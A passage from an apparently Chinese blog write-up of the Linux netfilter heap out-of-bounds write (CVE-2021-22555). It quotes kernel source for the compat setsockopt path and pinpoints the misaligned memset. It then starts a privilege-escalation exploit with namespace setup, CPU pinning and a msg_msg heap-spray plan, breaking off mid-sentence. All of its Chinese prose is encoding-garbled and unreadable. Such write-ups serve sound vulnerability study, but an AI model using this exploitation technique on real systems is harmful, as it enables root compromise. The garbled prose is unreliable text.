CONFIG_COMPAT</span></span><br><span class="line">.compat_setsockopt = compat_ip_setsockopt,</span><br><span class="line">.compat_getsockopt = compat_ip_getsockopt,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">.mtu_reduced   = tcp_v4_mtu_reduced,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ç”±äºæˆ‘ä»¬å¼€å¯äº† Netfilterï¼Œæ‰€ä»¥åœ¨ <code>compat_ip_setsockopt()</code> æœ€åä¼šè°ƒç”¨åˆ° <code>compat_nf_setsockopt</code> ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">compat_ip_setsockopt</span><span class="params">(<span class="keyword">struct</span> sock *sk, <span class="type">int</span> level, <span class="type">int</span> optname,</span></span><br><span class="line"><span class="params"> <span class="type">char</span> __user *optval, <span class="type">unsigned</span> <span class="type">int</span> optlen)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="meta">#<span class="keyword">ifdef</span> CONFIG_NETFILTER</span></span><br><span class="line"><span class="comment">/* we need to exclude all possible ENOPROTOOPTs except default case */</span></span><br><span class="line"><span class="keyword">if</span> (err == -ENOPROTOOPT &amp;&amp; optname != IP_HDRINCL &amp;&amp;</span><br><span class="line">optname != IP_IPSEC_POLICY &amp;&amp;</span><br><span class="line">optname != IP_XFRM_POLICY &amp;&amp;</span><br><span class="line">!ip_mroute_opt(optname))</span><br><span class="line">err = compat_nf_setsockopt(sk, PF_INET, optname, optval,</span><br><span class="line">   optlen);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(compat_ip_setsockopt);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°å’Œ <code>compat_nf_getsockopt()</code> ä¸€æ ·éƒ½æ˜¯ <code>compat_nf_sockopt()</code> çš„ wrapperï¼Œåœ¨è¯¥å‡½æ•°ä¸­ä¼šä½¿ç”¨ æ‰¾åˆ°å¯¹åº”çš„å‡½æ•°è¡¨ï¼Œæ ¹æ®å¯¹åº”æ“ä½œè°ƒç”¨å¯¹åº”å‡½æ•°ï¼Œæˆ‘ä»¬æ˜¯ 32 ä½è¿›ç¨‹çš„ç³»ç»Ÿè°ƒç”¨ï¼Œæ‰€ä»¥åº”è¯¥èµ°å…¥ <code>compat_set</code>è¿™ä¸€æŒ‡é’ˆ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">compat_nf_sockopt</span><span class="params">(<span class="keyword">struct</span> sock *sk, <span class="type">u_int8_t</span> pf, <span class="type">int</span> val,</span></span><br><span class="line"><span class="params">     <span class="type">char</span> __user *opt, <span class="type">int</span> *len, <span class="type">int</span> get)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nf_sockopt_ops</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">ops = nf_sockopt_find(sk, pf, val, get);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(ops))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(ops);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (get) &#123;</span><br><span class="line"><span class="keyword">if</span> (ops-&gt;compat_get)</span><br><span class="line">ret = ops-&gt;compat_get(sk, val, opt, len);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">ret = ops-&gt;get(sk, val, opt, len);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (ops-&gt;compat_set)</span><br><span class="line">ret = ops-&gt;compat_set(sk, val, opt, *len);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">ret = ops-&gt;<span class="built_in">set</span>(sk, val, opt, *len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_put(ops-&gt;owner);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå…·ä½“è°ƒç”¨åˆ°å“ªä¸ªå‡½æ•°ï¼Ÿåœ¨ <code>nf_sockopt_find</code> ä¸­ä½¿ç”¨å†…æ ¸åŒå‘é“¾è¡¨éå†å®éå†å…¨å±€å˜é‡<code>nf_sockopts</code>ï¼Œåˆ¤æ–­æ¡ä»¶æ˜¯å‡½æ•°è¡¨çš„ pf ç­‰äºæˆ‘ä»¬åœ¨ä¸Šå±‚ä¼ å…¥çš„ pfï¼ˆåœ¨ <code>compat_ip_setsockopt</code> ä¸­ä¼ å…¥çš„ä¸º <code>PF_INET</code>ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> nf_sockopt_ops *<span class="title function_">nf_sockopt_find</span><span class="params">(<span class="keyword">struct</span> sock *sk, <span class="type">u_int8_t</span> pf,</span></span><br><span class="line"><span class="params"><span class="type">int</span> val, <span class="type">int</span> get)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nf_sockopt_ops</span> *<span class="title">ops</span>;</span></span><br><span class="line"></span><br><span class="line">mutex_lock(&amp;nf_sockopt_mutex);</span><br><span class="line">list_for_each_entry(ops, &amp;nf_sockopts, <span class="built_in">list</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (ops-&gt;pf == pf) &#123;</span><br><span class="line"><span class="keyword">if</span> (!try_module_get(ops-&gt;owner))</span><br><span class="line"><span class="keyword">goto</span> out_nosup;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (get) &#123;</span><br><span class="line"><span class="keyword">if</span> (val &gt;= ops-&gt;get_optmin &amp;&amp;</span><br><span class="line">val &lt; ops-&gt;get_optmax)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (val &gt;= ops-&gt;set_optmin &amp;&amp;</span><br><span class="line">val &lt; ops-&gt;set_optmax)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line">module_put(ops-&gt;owner);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">out_nosup:</span><br><span class="line">ops = ERR_PTR(-ENOPROTOOPT);</span><br><span class="line">out:</span><br><span class="line">mutex_unlock(&amp;nf_sockopt_mutex);</span><br><span class="line"><span class="keyword">return</span> ops;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>åœ¨ iptables æ¨¡å—çš„åˆå§‹åŒ–å‡½æ•°ä¸­æ³¨å†Œäº†å‡½æ•°è¡¨</strong> <code>ipt_sockopts</code>ï¼Œ<code>nf_register_sockopt()</code> ç”¨ä»¥åœ¨ <code>nf_sockopts</code> é“¾è¡¨ä¸­æ’å…¥èŠ‚ç‚¹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">ip_tables_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Register setsockopt */</span></span><br><span class="line">ret = nf_register_sockopt(&amp;ipt_sockopts);</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆä¸€åˆ‡å°±æ¸…æ¥šäº†ï¼Œå¯¹äº setsockopt ç³»ç»Ÿè°ƒç”¨ï¼Œæˆ‘ä»¬æœ€ç»ˆè°ƒç”¨çš„åº”è¯¥æ˜¯ <code>compat_do_ipt_set_ctl</code> å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">nf_sockopt_ops</span> <span class="title">ipt_sockopts</span> =</span> &#123;</span><br><span class="line">.pf= PF_INET,</span><br><span class="line">.set_optmin= IPT_BASE_CTL,</span><br><span class="line">.set_optmax= IPT_SO_SET_MAX+<span class="number">1</span>,</span><br><span class="line">.<span class="built_in">set</span>= do_ipt_set_ctl,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line">.compat_set= compat_do_ipt_set_ctl,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">.get_optmin= IPT_BASE_CTL,</span><br><span class="line">.get_optmax= IPT_SO_GET_MAX+<span class="number">1</span>,</span><br><span class="line">.get= do_ipt_get_ctl,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line">.compat_get= compat_do_ipt_get_ctl,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">.owner= THIS_MODULE,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="0x01-æ¼æ´åˆ†æ"><a href="#0x01-æ¼æ´åˆ†æ" class="headerlink" title="0x01.æ¼æ´åˆ†æ"></a>0x01.æ¼æ´åˆ†æ</h1><p>å‰é¢è®²åˆ° 32 ä½ç¨‹åºçš„ setsockopt ç³»ç»Ÿè°ƒç”¨æœ€ç»ˆä¼šè°ƒç”¨åˆ° <code>compat_do_ipt_set_ctl()</code>ï¼Œè€Œæ¼æ´ä¾¿å‘ç”Ÿåœ¨å½“æˆ‘ä»¬æŒ‡å®š optname ä¸º <code>IPT_SO_SET_REPLACE</code> æ—¶ï¼Œå…¶æœ€ç»ˆä¼šè°ƒç”¨ <code>compat_do_replace()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">compat_do_ipt_set_ctl</span><span class="params">(<span class="keyword">struct</span> sock *sk,<span class="type">int</span> cmd, <span class="type">void</span> __user *user,</span></span><br><span class="line"><span class="params">      <span class="type">unsigned</span> <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!ns_capable(sock_net(sk)-&gt;user_ns, CAP_NET_ADMIN))</span><br><span class="line"><span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line"><span class="keyword">case</span> IPT_SO_SET_REPLACE:</span><br><span class="line">ret = compat_do_replace(sock_net(sk), user, len);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> IPT_SO_SET_ADD_COUNTERS:</span><br><span class="line">ret = do_add_counters(sock_net(sk), user, len, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">ret = -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å­˜åœ¨å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">compat_do_ipt_set_ctl()</span><br><span class="line">    compat_do_replace()</span><br><span class="line">    translate_compat_table()</span><br><span class="line">    compat_copy_entry_from_user()</span><br><span class="line">    xt_compat_match_from_user()</span><br><span class="line">    xt_compat_target_from_user()</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæå‰è¯´æ˜ï¼š<strong>æ¼æ´åœ¨</strong> <code>xt_compat_match_from_user()</code> <strong>ä¸</strong> <code>xt_compat_target_from_user()</code> <strong>ä¸­éƒ½å­˜åœ¨ï¼Œé€»è¾‘ç›¸åŒ</strong></p><p>æˆ‘ä»¬å…ˆæ¥çœ‹ <code>xt_compat_target_from_user()</code>ï¼Œåœ¨è¿™é‡Œä¼šå°† <code>t-&gt;data + target-&gt;targetsize</code> èµ·å§‹çš„é•¿åº¦ä¸º <code>pad</code> çš„åŒºåŸŸç½® 0ï¼šå…ˆå°† targetsize å‘ä¸Šä¸ 8 å¯¹é½ï¼Œä¹‹åå†å‡å» targetsizeï¼Œå‰©ä¸‹çš„è¿™æ®µè‡ªç„¶å°±æ˜¯åˆ†é…çš„ object å‡å» targetsize åçš„å‰©ä½™ç©ºé—´</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">xt_compat_target_from_user</span><span class="params">(<span class="keyword">struct</span> xt_entry_target *t, <span class="type">void</span> **dstptr,</span></span><br><span class="line"><span class="params"><span class="type">unsigned</span> <span class="type">int</span> *size)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">xt_target</span> *<span class="title">target</span> =</span> t-&gt;u.kernel.target;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">compat_xt_entry_target</span> *<span class="title">ct</span> =</span> (<span class="keyword">struct</span> compat_xt_entry_target *)t;</span><br><span class="line"><span class="type">int</span> pad, off = xt_compat_target_offset(target);</span><br><span class="line"><span class="type">u_int16_t</span> tsize = ct-&gt;u.user.target_size;</span><br><span class="line"><span class="type">char</span> name[<span class="keyword">sizeof</span>(t-&gt;u.user.name)];</span><br><span class="line"></span><br><span class="line">t = *dstptr;</span><br><span class="line"><span class="built_in">memcpy</span>(t, ct, <span class="keyword">sizeof</span>(*ct));</span><br><span class="line"><span class="keyword">if</span> (target-&gt;compat_from_user)</span><br><span class="line">target-&gt;compat_from_user(t-&gt;data, ct-&gt;data);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">memcpy</span>(t-&gt;data, ct-&gt;data, tsize - <span class="keyword">sizeof</span>(*ct));</span><br><span class="line">pad = XT_ALIGN(target-&gt;targetsize) - target-&gt;targetsize;</span><br><span class="line"><span class="keyword">if</span> (pad &gt; <span class="number">0</span>)</span><br><span class="line"><span class="built_in">memset</span>(t-&gt;data + target-&gt;targetsize, <span class="number">0</span>, pad);<span class="comment">// æ¼æ´äº§ç”Ÿç‚¹</span></span><br><span class="line"></span><br><span class="line">tsize += off;</span><br><span class="line">t-&gt;u.user.target_size = tsize;</span><br><span class="line">strlcpy(name, target-&gt;name, <span class="keyword">sizeof</span>(name));</span><br><span class="line">module_put(target-&gt;me);</span><br><span class="line"><span class="built_in">strncpy</span>(t-&gt;u.user.name, name, <span class="keyword">sizeof</span>(t-&gt;u.user.name));</span><br><span class="line"></span><br><span class="line">*size += off;</span><br><span class="line">*dstptr += tsize;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(xt_compat_target_from_user);</span><br></pre></td></tr></table></figure><p>ç†æƒ³æƒ…å†µä¸‹ï¼Œåº”è¯¥æ˜¯æŒ‰ç…§å¦‚ä¸‹æ–¹å¼è¿›è¡Œæ¸…é›¶çš„ï¼Œçœ‹èµ·æ¥å¥½åƒæ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼Ÿï¼ˆä¸‹å›¾ä¾‹å­ä¸­å‡è®¾ targetsize å°äº 8ï¼‰</p><p><img src="https://s2.loli.net/2022/03/31/3jlPfpg2AMYoZrv.png" alt="image.png"></p><p><strong>ä½†æ˜¯ t-&gt;data å¹¶ä¸ä¸€å®šæ˜¯ 8 å­—èŠ‚å¯¹é½çš„ï¼Œè€Œæˆ‘ä»¬è®¡ç®— pad æ—¶å´é»˜è®¤ t-&gt;data åº”å½“ 8 å­—èŠ‚å¯¹é½</strong>ï¼Œå› æ­¤è‹¥ t-&gt;data å¹¶é 8 å­—èŠ‚å¯¹é½ï¼Œè€Œ pad è®¡ç®—æ—¶å‘ä¸Šä¸ 8  å­—èŠ‚å¯¹é½ï¼Œ<strong>å°±ä¼šå¯¼è‡´è¶Šç•Œå†™å…¥æ•°å­—èŠ‚çš„ 0 åˆ°ç›¸é‚»çš„ä¸‹ä¸€ä¸ª object ä¸­</strong></p><p><img src="https://s2.loli.net/2022/03/31/eS15WvRZuz8f6HU.png" alt="image.png"></p><p>è¿™é‡Œç¬”è€…å¯¹å…¬å¼€çš„ exp è¿›è¡Œè°ƒè¯•ï¼Œå¯ä»¥çœ‹åˆ°çš„æ˜¯ t-&gt;data <strong>ç¡®ä¹å¯ä»¥ä¸ºä¸€ä¸ªé 8 å­—èŠ‚å¯¹é½çš„åœ°å€ï¼Œè€Œæ­¤æ—¶ target-&gt;targetsize å†å‘ä¸Šå¯¹ 8 å­—èŠ‚å¯¹é½ï¼Œè‡ªç„¶å°±ä¼šè¶Šç•Œå†™åˆ°ç›¸é‚»ä¸‹ä¸€ object çš„å¼€å¤´</strong></p><p><img src="https://s2.loli.net/2022/03/31/NBqKxZEDsOmgc64.png" alt="image.png"></p><p>åœ¨ <code>xt_compat_match_from_user()</code> ä¸­äº§ç”Ÿçš„æ¼æ´é€»è¾‘ç›¸åŒï¼Œè¿™é‡Œå°±ä¸èµ˜å™äº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">xt_compat_match_from_user</span><span class="params">(<span class="keyword">struct</span> xt_entry_match *m, <span class="type">void</span> **dstptr,</span></span><br><span class="line"><span class="params">       <span class="type">unsigned</span> <span class="type">int</span> *size)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">xt_match</span> *<span class="title">match</span> =</span> m-&gt;u.kernel.match;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">compat_xt_entry_match</span> *<span class="title">cm</span> =</span> (<span class="keyword">struct</span> compat_xt_entry_match *)m;</span><br><span class="line"><span class="type">int</span> pad, off = xt_compat_match_offset(match);</span><br><span class="line"><span class="type">u_int16_t</span> msize = cm-&gt;u.user.match_size;</span><br><span class="line"><span class="type">char</span> name[<span class="keyword">sizeof</span>(m-&gt;u.user.name)];</span><br><span class="line"></span><br><span class="line">m = *dstptr;</span><br><span class="line"><span class="built_in">memcpy</span>(m, cm, <span class="keyword">sizeof</span>(*cm));</span><br><span class="line"><span class="keyword">if</span> (match-&gt;compat_from_user)</span><br><span class="line">match-&gt;compat_from_user(m-&gt;data, cm-&gt;data);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">memcpy</span>(m-&gt;data, cm-&gt;data, msize - <span class="keyword">sizeof</span>(*cm));</span><br><span class="line">pad = XT_ALIGN(match-&gt;matchsize) - match-&gt;matchsize;</span><br><span class="line"><span class="keyword">if</span> (pad &gt; <span class="number">0</span>)</span><br><span class="line"><span class="built_in">memset</span>(m-&gt;data + match-&gt;matchsize, <span class="number">0</span>, pad); <span class="comment">// æ¼æ´äº§ç”Ÿç‚¹</span></span><br><span class="line"></span><br><span class="line">msize += off;</span><br><span class="line">m-&gt;u.user.match_size = msize;</span><br><span class="line">strlcpy(name, match-&gt;name, <span class="keyword">sizeof</span>(name));</span><br><span class="line">module_put(match-&gt;me);</span><br><span class="line"><span class="built_in">strncpy</span>(m-&gt;u.user.name, name, <span class="keyword">sizeof</span>(m-&gt;u.user.name));</span><br><span class="line"></span><br><span class="line">*size += off;</span><br><span class="line">*dstptr += msize;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(xt_compat_match_from_user);</span><br></pre></td></tr></table></figure><h1 id="0x02-æ¼æ´åˆ©ç”¨"><a href="#0x02-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x02.æ¼æ´åˆ©ç”¨"></a>0x02.æ¼æ´åˆ©ç”¨</h1><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ¥è€ƒè™‘å¦‚ä½•åˆ©ç”¨è¿™ä¸ªè¶Šç•Œå†™ 0 çš„æ¼æ´ï¼Œç°åœ¨å…¬å¼€çš„è¿™ä¸€ä»½ exp åˆ©ç”¨ <code>msg_msg</code> æ„é€  UAFã€åˆ©ç”¨ <code>sk_buff</code> å†™å…¥ objectã€åˆ©ç”¨ <code>pipe_buffer</code> åŠ«æŒ RIPï¼Œç¬”è€…è®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„æ€è·¯ï¼Œæ‰€ä»¥åé¢ç¬”è€…æ„é€  exp ä¹Ÿä¼šéµå¾ªåŒæ ·çš„æ€è·¯å®Œæˆ</p><blockquote><p>ä¸‹é¢çš„å›¾ä¾‹å¤§éƒ¨åˆ†æ¥è‡ª <a href="https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html">Google çš„ security research åšå®¢</a>ï¼Œéå¸¸æ„Ÿè°¢ Google åšå‡ºäº†å¦‚æ­¤ç®€å•æ˜“æ‡‚çš„å›¾ä¾‹ï¼</p></blockquote><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><h3 id="Step-O-å¼€å§‹å‰çš„å‡†å¤‡å·¥ä½œ"><a href="#Step-O-å¼€å§‹å‰çš„å‡†å¤‡å·¥ä½œ" class="headerlink" title="Step.O å¼€å§‹å‰çš„å‡†å¤‡å·¥ä½œ"></a>Step.O å¼€å§‹å‰çš„å‡†å¤‡å·¥ä½œ</h3><p>ä¸ºäº†è§¦å‘åˆ°æ¼æ´çš„è·¯å¾„ï¼Œæˆ‘ä»¬åº”å½“ä½¿ç”¨ <code>unshare()</code> éš”ç¦»å‡ºå¯¹åº”çš„çš„å‘½åç©ºé—´ï¼ŒåŒæ—¶ä¸ºäº†æé«˜å †å–·çš„ç¨³å®šæ€§ï¼Œæˆ‘ä»¬å°†è¿›ç¨‹ç»‘å®šåˆ°å›ºå®šæ ¸å¿ƒä¸Š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (unshare(CLONE_NEWUSER) &lt; <span class="number">0</span>)</span><br><span class="line">    errExit(<span class="string">&quot;failed to unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (unshare(CLONE_NEWNET) &lt; <span class="number">0</span>)</span><br><span class="line">    errExit(<span class="string">&quot;failed to unshare(CLONE_NEWNET)&quot;</span>);</span><br><span class="line"></span><br><span class="line">CPU_ZERO(&amp;cpu_set);</span><br><span class="line">CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br></pre></td></tr></table></figure><blockquote><p>å¦‚æœä¸éš”ç¦»å‡ºç‹¬ç«‹å‘½åç©ºé—´çš„è¯<strong>ä¾¿ä¸ä¼šèµ°åˆ°è§¦å‘æ¼æ´çš„è·¯å¾„</strong>ï¼Œå› ä¸ºæˆ‘ä»¬éœ€è¦ <code>CAP_SYS_ADMIN</code> æƒé™ï¼Œä½œä¸ºæ™®é€šç”¨æˆ·åªèƒ½é€šè¿‡å‘½åç©ºé—´éš”ç¦»è¿›è¡Œè·å–</p></blockquote><h3 id="Step-I-å †å–·-msg-msg-ï¼Œå»ºç«‹ä¸»ä»æ¶ˆæ¯é˜Ÿåˆ—ï¼Œæ„é€ é‡å è¾…åŠ©æ¶ˆæ¯"><a href="#Step-I-å †å–·-msg-msg-ï¼Œå»ºç«‹ä¸»ä»æ¶ˆæ¯é˜Ÿåˆ—ï¼Œæ„é€ é‡å è¾…åŠ©æ¶ˆæ¯" class="headerlink" title="Step.I å †å–· msg_msg ï¼Œå»ºç«‹ä¸»ä»æ¶ˆæ¯é˜Ÿåˆ—ï¼Œæ„é€ é‡å è¾…åŠ©æ¶ˆæ¯"></a>Step.I å †å–· <code>msg_msg</code> ï¼Œå»ºç«‹ä¸»ä»æ¶ˆæ¯é˜Ÿåˆ—ï¼Œæ„é€ é‡å è¾…åŠ©æ¶ˆæ¯</h3><p>ç°åœ¨æˆ‘ä»¬æœ‰äº†ä¸€ä¸ªå †ä¸Š off-by-oneï¼Œæˆ‘ä»¬è¯¥æ€ä¹ˆåˆ©ç”¨å‘¢ï¼Ÿæ¯”è¾ƒæœ´ç´ çš„ä¸€ç§æ€æƒ³ä¾¿æ˜¯è¦†å†™ä¸€ä¸ªå¤´éƒ¨ä¸ºæŒ‡é’ˆçš„ç»“æ„ä½“ï¼Œåˆ©ç”¨ partial overwrite ä½¿å¾—ä¸¤ä¸ªè¿™æ ·çš„ç»“æ„ä½“çš„å¤´éƒ¨æŒ‡é’ˆæŒ‡å‘åŒä¸€ä¸ªç»“æ„ä½“ï¼Œ<strong>ä»è€Œå®ç° object overlapping</strong></p><p>é‚£ä¹ˆé€‰ç”¨ä»€ä¹ˆæ ·çš„ç»“æ„ä½“ä½œä¸º victim å‘¢ï¼Ÿè¿™é‡Œæˆ‘ä»¬é€‰æ‹©ä½¿ç”¨ <code>msg_msg</code> è¿™ä¸€ç»“æ„ä½“ï¼Œå…¶é•¿åº¦å¯æ§ï¼Œä¸”å¼€å¤´æ­£å¥½æ˜¯å†…æ 